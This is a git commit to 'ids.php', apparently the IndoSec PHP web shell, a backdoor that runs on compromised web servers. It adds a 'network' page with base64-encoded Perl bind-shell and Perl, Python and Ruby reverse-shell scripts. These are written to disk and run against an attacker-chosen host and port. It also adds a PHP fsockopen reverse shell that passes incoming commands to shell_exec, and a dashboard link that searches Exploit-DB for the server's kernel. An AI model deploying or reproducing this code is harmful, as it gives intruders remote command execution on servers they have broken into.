cfea7582713b1c4eef3ad131176f1db4916b85b5
rizsyad <rizsyad@gmail.com>
2022-07-23 17:15:23 +0700

    Add backconnect tools

--- ids.php
+++ ids.php
@@ -29,6 +29,7 @@ error_reporting(0);
 @ignore_user_abort(0);
 @clearstatcache();
 
+
 if (@function_exists('ini_set')) {
 	@ini_set('error_log', NULL);
 	@ini_set('log_errors', 0);
@@ -57,6 +58,8 @@ if (@function_exists('ini_set')) {
 /* Configurasi */
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
+$mode					= "prod";
+$BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";
 
 function curlRequest($url)
 {
@@ -72,7 +75,9 @@ function curlRequest($url)
 // mendapatkan content page
 function getContentPage($page, $search = "", $replace = "") 
 {
-	$url = "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/page/$page.html";
+	global $BASE_URL;
+
+	$url = "$BASE_URL/page/$page.html";
 
 	$content = (curlRequest($url) ?? file_get_contents($url));
 
@@ -87,7 +92,8 @@ function getContentPage($page, $search = "", $replace = "")
 // mendapatkan file image
 function getImageUrl($ext) 
 {
-    return "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/assets/img/$ext.png";
+	global $BASE_URL;
+    return "$BASE_URL/assets/img/$ext.png";
 }
 
 function image($ext, $attr) {
@@ -300,7 +306,7 @@ function zipFile($data, $dir, $type)
 function breadcrumb($page)
 {
 	$li = "";
-	$exclude = array("files");
+	$exclude = array("files", "mass", "tools");
 
 	for ($i=0; $i < count($page); $i++) { 
 		$pages = strtolower(preg_replace('/\s+/', '', $page[$i]));
@@ -373,7 +379,7 @@ $free 			= disk_free_space($path);
 $usage			= (formatSize1($total)-formatSize1($free));
 $ds 			= @ini_get("disable_functions");
 $apachemodul 	= (function_exists("apache_get_modules")) ? implode(', ', apache_get_modules()) : "<font color=red>NONE</font>";
-$show_ds 		= (!empty($ds)) ? "<a href='?path=$path&aksi=disabfunc' class='ds'>$ds</a>" : "<font color=green>NONE</font>";
+$show_ds 		= (!empty($ds)) ? "<a href='#'>$ds</a>" : "<font color=green>NONE</font>";
 $d0mains 		= @file("/etc/named.conf", false);
 
 $supportDB = array();
@@ -720,7 +726,7 @@ function adminer()
 	else if (downloadAdminer()) $output = "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
 	else $output = "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
 
-	pages("adminer", ["Database", "Adminer"], array("{{OUTPUT}}"), array($output));
+	pages("adminer", ["Tools", "Adminer"], array("{{OUTPUT}}"), array($output));
 }
 
 function backup() {
@@ -762,9 +768,138 @@ function backup() {
 
 }
 
+
+function dashboard() {
+
+	global $ver;
+	global $ip;
+	global $supportDB;
+	global $curl;
+	global $mail;
+	global $show_ds;
+	global $sof;
+	global $os;
+	global $usage;
+	global $apachemodul;
+	global $sm;
+	global $zip;
+	global $free;
+	global $total;
+
+	$arrFind = [
+		"{{countDomain}}", 
+		"{{PHPVERSION}}", 
+		"{{IPSERVER}}",
+		"{{SUPPORTDB}}",
+		"{{CURL}}",
+		"{{MAILER}}",
+		"{{DF}}",
+		"{{SOFT}}",
+		"{{OS}}",
+		"{{FREEUSAGE}}",
+		"{{USAGE}}",
+		"{{TOTALUSAGE}}",
+		"{{APACHE}}",
+		"{{SM}}",
+		"{{ZIP}}",
+		"{{IPCLIENT}}"
+	];
+
+	$arrReplace = [ 
+		countDomain(), 
+		$ver, 
+		$ip,
+		$supportDB,
+		$curl,
+		$mail,
+		$show_ds,
+		$sof,
+		$os." [<a href='https://www.exploit-db.com/search?q=".php_uname('s')."+Kernel+".php_uname('r')."' target='_blank' rel='noreferrer'>Exploit DB</a>] ",
+		formatSize1($free),
+		$usage,
+		"Total: ".formatSize($total),
+		$apachemodul,
+		$sm,
+		$zip,
+		$_SERVER['REMOTE_ADDR'],
+	];
+
+	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
+}
+
+function network() {
+	pages("network", ["Tools","Network"]);
+
+	if($_POST['bpl']){
+		$bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
+		$brt = @fopen('bp.pl','w');
+		fwrite($brt,$bp);
+		$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
+		sleep(1);
+		echo "<pre class='text-light'>$out\n".exe("ps aux | grep bp.pl")."</pre>";
+		unlink("bp.pl");
+	}
+	if($_POST['backconnect'] == 'perl'){
+		$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
+		$plbc = @fopen('bc.pl','w');
+		fwrite($plbc,$bc);
+		$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
+		sleep(1);
+		echo "<pre class='text-light'>$out\n".exe("ps aux | grep bc.pl")."</pre>";
+		unlink("bc.pl");
+	}
+	if($_POST['backconnect'] == 'python'){
+		$becaa = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
+		$pbcaa = @fopen('bcpyt.py','w');
+		fwrite($pbcaa,$becaa);
+		$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
+		sleep(1);
+		echo "<pre class='text-light'>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
+		unlink("bcpyt.py");
+	}
+	if($_POST['backconnect'] == 'ruby'){
+		$becaak = base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
+		$pbcaak = @fopen('bcruby.rb','w');
+		fwrite($pbcaak,$becaak);
+		$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
+		sleep(1);
+		echo "<pre class='text-light'>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
+		unlink("bcruby.rb");
+	}
+	if($_POST['backconnect'] == 'php'){
+		$ip = $_POST['server'];
+		$port = $_POST['port'];
+		$sockfd = fsockopen($ip , $port , $errno, $errstr );
+		if($errno != 0){
+			echo "<font color='red'>$errno : $errstr</font>";
+		}else if (!$sockfd){
+			$result = "<p>Unexpected error has occured, connection may have failed.</p>";
+		}else{
+			fputs ($sockfd ,"
+			\n{#######################################}
+			\n..:: BackConnect PHP By Con7ext ::..
+			\n{#######################################}\n");
+			$dir = @shell_exec("pwd");
+			$sysinfo = @shell_exec("uname -a");
+			$time = @Shell_exec("time");
+			$len = 1337;
+			fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
+			while(!feof($sockfd)){
+				$cmdPrompt = '[kuda]#:> ';
+				@fputs ($sockfd , $cmdPrompt );
+				$command= fgets($sockfd, $len);
+				@fputs($sockfd , "\n" . @shell_exec($command) . "\n\n");
+			}
+			@fclose($sockfd);
+		}
+	}
+
+}
+
 if(isset($_GET["page"]))
 {
 	$page = $_GET["page"];
+	if($page == "dashboard") dashboard();
 
 	// File
 	if($page == "filemanager") filemanager();
@@ -783,55 +918,18 @@ if(isset($_GET["page"]))
 	// if($page == "mdeface") mdeface();
 	if($page == "mdelete") mdelete();
 
-	// Database
+	// Tools
 	if($page == "adminer") adminer();
+	if($page == "network") network();
 
 	// Info
 	if($page == "about") pages($page, ["About"]);
 	if($page == "phpinfo") phpinfo();
 
+
 	if($page == "logout") {
 		session_destroy() ;
 		echo '<script>window.location="?";</script>';
 	} 
-} 
-else 
-{
-	$arrFind = [
-		"{{countDomain}}", 
-		"{{PHPVERSION}}", 
-		"{{IPSERVER}}",
-		"{{SUPPORTDB}}",
-		"{{CURL}}",
-		"{{MAILER}}",
-		"{{DF}}",
-		"{{SOFT}}",
-		"{{OS}}",
-		"{{FREEUSAGE}}",
-		"{{USAGE}}",
-		"{{TOTALUSAGE}}",
-		"{{APACHE}}",
-		"{{SM}}",
-		"{{ZIP}}",
-	];
 
-	$arrReplace = [ 
-		countDomain(), 
-		$ver, 
-		$ip,
-		$supportDB,
-		$curl,
-		$mail,
-		$show_ds,
-		$sof,
-		$os,
-		formatSize1($free),
-		$usage,
-		"Total: ".formatSize($total),
-		$apachemodul,
-		$sm,
-		$zip
-	];
-
-	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
-}
+} else { dashboard(); }
